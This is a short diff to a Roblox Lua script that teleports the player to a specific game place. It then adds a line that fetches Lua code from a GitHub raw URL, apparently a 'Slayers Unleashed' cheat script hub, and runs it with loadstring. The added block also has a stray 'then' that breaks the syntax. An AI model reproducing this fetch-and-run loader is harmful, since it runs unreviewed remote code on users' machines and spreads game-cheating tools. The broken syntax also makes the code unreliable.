@@ -9,3 +9,7 @@ if game.PlaceId ~= 6536647319 then
     local plr = game.Players.LocalPlayer
     tpservice:Teleport(6536647319, plr)
 end
+
+then
+wait(1.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureServicess/Syn-God-Form/main/Slayers%20Unleashed/lua"))()
